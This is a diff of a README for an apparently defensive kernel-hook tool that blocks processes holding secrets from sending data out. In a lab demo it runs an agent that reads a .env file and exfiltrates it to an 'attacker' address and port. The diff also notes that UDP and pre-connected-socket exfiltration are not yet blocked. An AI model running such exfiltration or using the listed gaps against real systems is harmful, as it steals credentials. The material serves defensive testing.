@@ -74,8 +74,8 @@ Back in the VM:
 ```bash
 # 5. Run the demo agent
 python3 demo/internal_api.py --port 8080 &
-python3 demo/agent.py --env demo/project/.env --api http://127.0.0.1:8080/ingest \
-    --target 192.168.122.1:9999 --exfil direct
+python3 demo/agent.py --mode direct --env demo/project/.env --attacker 192.168.122.1 \
+    --port 9999 --api http://127.0.0.1:8080
 ```
 
 Firewall ports: on the host, `sudo firewall-cmd --zone=libvirt --add-port=9999/tcp --add-port=9999/udp`; in the VM, `sudo firewall-cmd --add-port=8765/tcp`.
@@ -103,8 +103,8 @@ cd dashboard && npm install && npm start
 | Base64 / any encoding | Content is never inspected; the process is tagged |
 | Any port | Allowlist is by address |
 | IPv6 and IPv4-mapped IPv6 | Hooks B/C handle it; not tested on the demo VM (no v6 route); IPv4-mapped IPv6 is tested |
-| UDP `sendto()` | Hook C |
-| Socket connected *before* reading the secret, then `send()` | Hook C checks the connected peer |
+| UDP `sendto()` | Hook C. **NOT BLOCKED until hook C lands** (hook C, `socket_sendmsg`, is not in the kernel yet) |
+| Socket connected *before* reading the secret, then `send()` | Hook C checks the connected peer. **NOT BLOCKED until hook C lands** (hook C, `socket_sendmsg`, is not in the kernel yet) |
 
 ## What it does not block (known gaps)
 
